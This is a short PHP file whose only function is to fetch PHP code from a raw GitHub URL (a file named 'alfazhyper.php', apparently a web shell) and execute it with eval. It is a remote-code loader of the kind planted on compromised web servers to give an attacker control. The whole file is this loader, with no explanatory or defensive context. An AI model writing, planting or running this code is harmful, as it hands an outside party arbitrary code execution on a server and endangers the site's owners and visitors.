<?php

$content = file_get_contents(urldecode('https://raw.githubusercontent.com/zhyperflowtzy/caritausendiri/main/alfazhyper.php'));

$content = "?> ".$content;
eval($content);
